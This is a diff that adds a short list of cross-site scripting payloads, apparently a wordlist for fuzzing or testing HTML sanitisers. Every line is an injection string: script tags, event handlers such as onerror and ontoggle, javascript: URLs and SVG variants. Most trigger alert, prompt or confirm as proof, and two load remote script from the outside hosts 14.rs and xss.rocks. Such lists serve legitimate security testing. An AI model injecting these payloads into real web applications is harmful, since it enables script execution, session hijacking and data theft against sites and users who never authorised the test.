@@ -1,0 +1,22 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)></svg>
+<svg><script>alert(1)</script>
+<iframe src=javascript:alert(1)>
+"'><script>alert(1)</script>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<a href=javascript:alert(1)>x</a>
+<form action=javascript:alert(1)><input type=submit>
+<math href=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<link rel=import href=javascript:alert(1)>
+<img src=1 onerror=prompt(1)>
+<img src=1 onerror=confirm(1)>
+<script src=//14.rs></script>
+<script src=//xss.rocks></script>
+<svg xmlns=xlink:xlink href=javascript:alert(1) />
+<svg><a href=javascript:alert(1)>x</a></svg>
+
+
